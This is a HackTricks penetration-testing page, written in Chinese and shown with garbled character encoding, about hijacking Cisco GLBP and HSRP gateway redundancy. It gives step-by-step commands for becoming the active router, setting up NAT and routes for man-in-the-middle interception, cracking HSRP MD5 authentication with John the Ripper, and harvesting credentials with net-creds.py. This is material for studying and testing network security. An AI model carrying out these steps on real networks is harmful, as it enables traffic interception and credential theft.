# GLBP & HSRP æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–**å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## FHRP åŠ«æŒæ¦‚è¿°

### FHRP æ¦‚è§ˆ
FHRP æ—¨åœ¨é€šè¿‡å°†å¤šä¸ªè·¯ç”±å™¨åˆå¹¶ä¸ºå•ä¸ªè™šæ‹Ÿå•å…ƒæ¥æä¾›ç½‘ç»œé²æ£’æ€§ï¼Œä»è€Œå¢å¼ºè´Ÿè½½åˆ†é…å’Œå®¹é”™èƒ½åŠ›ã€‚æ€ç§‘ç³»ç»Ÿæ¨å‡ºäº†è¯¥å¥—ä»¶ä¸­çš„é‡è¦åè®®ï¼Œå¦‚ GLBP å’Œ HSRPã€‚

### GLBP åè®®æ¦‚è¿°
æ€ç§‘çš„åˆ›é€ ï¼ŒGLBPï¼Œåœ¨ TCP/IP åè®®æ ˆä¸Šè¿è¡Œï¼Œåˆ©ç”¨ç«¯å£ 3222 ä¸Šçš„ UDP è¿›è¡Œé€šä¿¡ã€‚GLBP ç»„ä¸­çš„è·¯ç”±å™¨æ¯éš” 3 ç§’äº¤æ¢ä¸€æ¬¡â€œhelloâ€æ•°æ®åŒ…ã€‚å¦‚æœè·¯ç”±å™¨åœ¨ 10 ç§’å†…æœªå‘é€è¿™äº›æ•°æ®åŒ…ï¼Œåˆ™è¢«è§†ä¸ºç¦»çº¿ã€‚ä½†æ˜¯ï¼Œè¿™äº›è®¡æ—¶å™¨ä¸æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥è¿›è¡Œä¿®æ”¹ã€‚

### GLBP æ“ä½œå’Œè´Ÿè½½åˆ†é…
GLBP é€šè¿‡ä½¿ç”¨å•ä¸ªè™šæ‹Ÿ IP å’Œå¤šä¸ªè™šæ‹Ÿ MAC åœ°å€å®ç°è·¨è·¯ç”±å™¨çš„è´Ÿè½½åˆ†é…ã€‚åœ¨ GLBP ç»„ä¸­ï¼Œæ¯ä¸ªè·¯ç”±å™¨éƒ½å‚ä¸æ•°æ®åŒ…è½¬å‘ã€‚ä¸ HSRP/VRRP ä¸åŒï¼ŒGLBP é€šè¿‡å‡ ç§æœºåˆ¶æä¾›çœŸæ­£çš„è´Ÿè½½å¹³è¡¡ï¼š

- **ä¸»æœºç›¸å…³è´Ÿè½½å¹³è¡¡ï¼š** ä¸ºä¸»æœºä¿æŒä¸€è‡´çš„ AVF MAC åœ°å€åˆ†é…ï¼Œå¯¹äºç¨³å®šçš„ NAT é…ç½®è‡³å…³é‡è¦ã€‚
- **è½®è¯¢è´Ÿè½½å¹³è¡¡ï¼š** é»˜è®¤æ–¹æ³•ï¼Œåœ¨è¯·æ±‚ä¸»æœºä¹‹é—´äº¤æ›¿åˆ†é… AVF MAC åœ°å€ã€‚
- **åŠ æƒè½®è¯¢è´Ÿè½½å¹³è¡¡ï¼š** æ ¹æ®é¢„å®šä¹‰çš„â€œæƒé‡â€æŒ‡æ ‡åˆ†é…è´Ÿè½½ã€‚

### GLBP ä¸­çš„å…³é”®ç»„ä»¶å’Œæœ¯è¯­
- **AVGï¼ˆæ´»åŠ¨è™šæ‹Ÿç½‘å…³ï¼‰ï¼š** è´Ÿè´£ä¸ºå¯¹ç­‰è·¯ç”±å™¨åˆ†é… MAC åœ°å€çš„ä¸»è¦è·¯ç”±å™¨ã€‚
- **AVFï¼ˆæ´»åŠ¨è™šæ‹Ÿè½¬å‘å™¨ï¼‰ï¼š** æŒ‡å®šç”¨äºç®¡ç†ç½‘ç»œæµé‡çš„è·¯ç”±å™¨ã€‚
- **GLBP ä¼˜å…ˆçº§ï¼š** å†³å®š AVG çš„åº¦é‡æ ‡å‡†ï¼Œä»é»˜è®¤å€¼ 100 å¼€å§‹ï¼ŒèŒƒå›´åœ¨ 1 åˆ° 255 ä¹‹é—´ã€‚
- **GLBP æƒé‡ï¼š** åæ˜ è·¯ç”±å™¨ä¸Šçš„å½“å‰è´Ÿè½½ï¼Œå¯ä»¥æ‰‹åŠ¨è°ƒæ•´æˆ–é€šè¿‡å¯¹è±¡è·Ÿè¸ªè¿›è¡Œè°ƒæ•´ã€‚
- **GLBP è™šæ‹Ÿ IP åœ°å€ï¼š** ä¸ºæ‰€æœ‰è¿æ¥è®¾å¤‡æä¾›ç½‘ç»œçš„é»˜è®¤ç½‘å…³ã€‚

åœ¨äº¤äº’æ–¹é¢ï¼ŒGLBP ä½¿ç”¨ä¿ç•™çš„ç»„æ’­åœ°å€ 224.0.0.102 å’Œ UDP ç«¯å£ 3222ã€‚è·¯ç”±å™¨æ¯éš” 3 ç§’ä¼ è¾“â€œhelloâ€æ•°æ®åŒ…ï¼Œå¦‚æœåœ¨ 10 ç§’çš„æŒç»­æ—¶é—´å†…é”™è¿‡ä¸€ä¸ªæ•°æ®åŒ…ï¼Œåˆ™è¢«è§†ä¸ºéæ“ä½œã€‚

### GLBP æ”»å‡»æœºåˆ¶
æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¼˜å…ˆçº§å€¼æœ€é«˜ï¼ˆ255ï¼‰çš„ GLBP æ•°æ®åŒ…æˆä¸ºä¸»è¦è·¯ç”±å™¨ã€‚è¿™å¯èƒ½å¯¼è‡´ DoS æˆ– MITM æ”»å‡»ï¼Œå…è®¸æ‹¦æˆªæˆ–é‡å®šå‘æµé‡ã€‚

### ä½¿ç”¨ Loki æ‰§è¡Œ GLBP æ”»å‡»
[Loki](https://github.com/raizo62/loki_on_kali) å¯ä»¥é€šè¿‡æ³¨å…¥ä¼˜å…ˆçº§å’Œæƒé‡è®¾ç½®ä¸º 255 çš„æ•°æ®åŒ…æ‰§è¡Œ GLBP æ”»å‡»ã€‚æ”»å‡»å‰çš„æ­¥éª¤åŒ…æ‹¬ä½¿ç”¨è¯¸å¦‚ Wireshark ç­‰å·¥å…·æ”¶é›†è™šæ‹Ÿ IP åœ°å€ã€è®¤è¯å­˜åœ¨å’Œè·¯ç”±å™¨ä¼˜å…ˆçº§å€¼ç­‰ä¿¡æ¯ã€‚

æ”»å‡»æ­¥éª¤ï¼š
1. åˆ‡æ¢åˆ°æ··æ‚æ¨¡å¼å¹¶å¯ç”¨ IP è½¬å‘ã€‚
2. ç¡®å®šç›®æ ‡è·¯ç”±å™¨å¹¶æ£€ç´¢å…¶ IPã€‚
3. ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„ Gratuitous ARPã€‚
4. æ³¨å…¥ä¸€ä¸ªæ¶æ„çš„ GLBP æ•°æ®åŒ…ï¼Œå†’å…… AVGã€‚
5. ä¸ºæ”»å‡»è€…çš„ç½‘ç»œæ¥å£åˆ†é…ä¸€ä¸ªæ¬¡è¦ IP åœ°å€ï¼Œé•œåƒ GLBP è™šæ‹Ÿ IPã€‚
6. å®æ–½ SNAT ä»¥å®Œå…¨å¯è§æµé‡ã€‚
7. è°ƒæ•´è·¯ç”±ä»¥ç¡®ä¿é€šè¿‡åŸå§‹ AVG è·¯ç”±å™¨ç»§ç»­è®¿é—®äº’è”ç½‘ã€‚

é€šè¿‡éµå¾ªè¿™äº›æ­¥éª¤ï¼Œæ”»å‡»è€…å°†è‡ªå·±å®šä½ä¸ºâ€œä¸­é—´äººâ€ï¼Œèƒ½å¤Ÿæ‹¦æˆªå’Œåˆ†æç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬æœªåŠ å¯†æˆ–æ•æ„Ÿæ•°æ®ã€‚

æ¼”ç¤ºæ‰€éœ€çš„å‘½ä»¤ç‰‡æ®µå¦‚ä¸‹ï¼š
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### ä½¿ç”¨net-creds.pyæˆ–ç±»ä¼¼å·¥å…·æ¥æ•è·å’Œåˆ†ææµç»å—æŸç½‘ç»œçš„æ•°æ®ï¼Œå¯ä»¥ç›‘è§†å’Œæ‹¦æˆªæµé‡ã€‚

### HSRPåŠ«æŒçš„è¢«åŠ¨è§£é‡ŠåŠå‘½ä»¤è¯¦ç»†ä¿¡æ¯

#### HSRPæ¦‚è¿°ï¼ˆçƒ­å¤‡ä»½è·¯ç”±å™¨/å†—ä½™åè®®ï¼‰
HSRPæ˜¯æ€ç§‘ä¸“æœ‰åè®®ï¼Œæ—¨åœ¨å®ç°ç½‘ç»œç½‘å…³å†—ä½™ã€‚å®ƒå…è®¸å°†å¤šä¸ªç‰©ç†è·¯ç”±å™¨é…ç½®ä¸ºå•ä¸ªé€»è¾‘å•å…ƒï¼Œå…±äº«ä¸€ä¸ªIPåœ°å€ã€‚è¿™ä¸ªé€»è¾‘å•å…ƒç”±ä¸»è·¯ç”±å™¨ç®¡ç†ï¼Œè´Ÿè´£æµé‡å¯¼å‘ã€‚ä¸GLBPä¸åŒï¼ŒGLBPä½¿ç”¨ä¼˜å…ˆçº§å’Œæƒé‡ç­‰æŒ‡æ ‡è¿›è¡Œè´Ÿè½½å¹³è¡¡ï¼ŒHSRPä¾èµ–å•ä¸ªæ´»åŠ¨è·¯ç”±å™¨è¿›è¡Œæµé‡ç®¡ç†ã€‚

#### HSRPä¸­çš„è§’è‰²å’Œæœ¯è¯­
- **HSRPæ´»åŠ¨è·¯ç”±å™¨**ï¼šå……å½“ç½‘å…³çš„è®¾å¤‡ï¼Œç®¡ç†æµé‡æµå‘ã€‚
- **HSRPå¤‡ç”¨è·¯ç”±å™¨**ï¼šå¤‡ç”¨è·¯ç”±å™¨ï¼Œå‡†å¤‡åœ¨æ´»åŠ¨è·¯ç”±å™¨æ•…éšœæ—¶æ¥ç®¡ã€‚
- **HSRPç»„**ï¼šä¸€ç»„è·¯ç”±å™¨åˆä½œå½¢æˆä¸€ä¸ªå•ä¸€çš„å¼¹æ€§è™šæ‹Ÿè·¯ç”±å™¨ã€‚
- **HSRP MACåœ°å€**ï¼šåˆ†é…ç»™HSRPè®¾ç½®ä¸­é€»è¾‘è·¯ç”±å™¨çš„è™šæ‹ŸMACåœ°å€ã€‚
- **HSRPè™šæ‹ŸIPåœ°å€**ï¼šHSRPç»„çš„è™šæ‹ŸIPåœ°å€ï¼Œå……å½“è¿æ¥è®¾å¤‡çš„é»˜è®¤ç½‘å…³ã€‚

#### HSRPç‰ˆæœ¬
HSRPæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒHSRPv1å’ŒHSRPv2ï¼Œä¸»è¦åŒºåˆ«åœ¨äºç»„å®¹é‡ã€å¤šæ’­IPä½¿ç”¨å’Œè™šæ‹ŸMACåœ°å€ç»“æ„ã€‚è¯¥åè®®åˆ©ç”¨ç‰¹å®šçš„å¤šæ’­IPåœ°å€è¿›è¡ŒæœåŠ¡ä¿¡æ¯äº¤æ¢ï¼Œæ¯3ç§’å‘é€ä¸€æ¬¡Helloæ•°æ®åŒ…ã€‚å¦‚æœåœ¨10ç§’å†…æœªæ”¶åˆ°æ•°æ®åŒ…ï¼Œåˆ™å‡å®šè·¯ç”±å™¨å¤„äºéæ´»åŠ¨çŠ¶æ€ã€‚

#### HSRPæ”»å‡»æœºåˆ¶
HSRPæ”»å‡»æ¶‰åŠé€šè¿‡æ³¨å…¥æœ€å¤§ä¼˜å…ˆçº§å€¼å¼ºåˆ¶æ¥ç®¡æ´»åŠ¨è·¯ç”±å™¨çš„è§’è‰²ã€‚è¿™å¯èƒ½å¯¼è‡´ä¸­é—´äººæ”»å‡»ã€‚æ”»å‡»å‰çš„åŸºæœ¬æ­¥éª¤åŒ…æ‹¬æ”¶é›†æœ‰å…³HSRPè®¾ç½®çš„æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨Wiresharkè¿›è¡Œæµé‡åˆ†æã€‚

#### ç»•è¿‡HSRPèº«ä»½éªŒè¯çš„æ­¥éª¤
1. å°†åŒ…å«HSRPæ•°æ®çš„ç½‘ç»œæµé‡ä¿å­˜ä¸º.pcapæ–‡ä»¶ã€‚
```shell
tcpdump -w hsrp_traffic.pcap
```
2. ä½¿ç”¨hsrp2john.pyä».pcapæ–‡ä»¶ä¸­æå–MD5å“ˆå¸Œã€‚
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. ä½¿ç”¨John the Ripperç ´è§£MD5å“ˆå¸Œã€‚
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**ä½¿ç”¨Lokiæ‰§è¡ŒHSRPæ³¨å…¥**

1. å¯åŠ¨Lokiä»¥è¯†åˆ«HSRPå¹¿å‘Šã€‚
2. å°†ç½‘ç»œæ¥å£è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼å¹¶å¯ç”¨IPè½¬å‘ã€‚
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. ä½¿ç”¨Lokiç„å‡†ç‰¹å®šè·¯ç”±å™¨ï¼Œè¾“å…¥ç ´è§£çš„HSRPå¯†ç ï¼Œå¹¶æ‰§è¡Œå¿…è¦çš„é…ç½®ä»¥å†’å……æ´»åŠ¨è·¯ç”±å™¨ã€‚
4. è·å¾—æ´»åŠ¨è·¯ç”±å™¨è§’è‰²åï¼Œé…ç½®æ‚¨çš„ç½‘ç»œæ¥å£å’ŒIPè¡¨ä»¥æ‹¦æˆªåˆæ³•æµé‡ã€‚
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. ä¿®æ”¹è·¯ç”±è¡¨ä»¥é€šè¿‡ä»¥å‰çš„æ´»åŠ¨è·¯ç”±å™¨è·¯ç”±æµé‡ã€‚
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. ä½¿ç”¨net-creds.pyæˆ–ç±»ä¼¼å®ç”¨ç¨‹åºä»æ‹¦æˆªçš„æµé‡ä¸­æ•è·å‡­æ®ã€‚
```shell
sudo python2 net-creds.py -i eth0
```

æ‰§è¡Œè¿™äº›æ­¥éª¤å°†ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ‹¦æˆªå’Œæ“çºµæµé‡ï¼Œç±»ä¼¼äºGLBPåŠ«æŒçš„è¿‡ç¨‹ã€‚è¿™çªæ˜¾äº†å†—ä½™åè®®å¦‚HSRPçš„æ¼æ´ä»¥åŠå¯¹å¼ºå¤§å®‰å…¨æªæ–½çš„éœ€æ±‚ã€‚
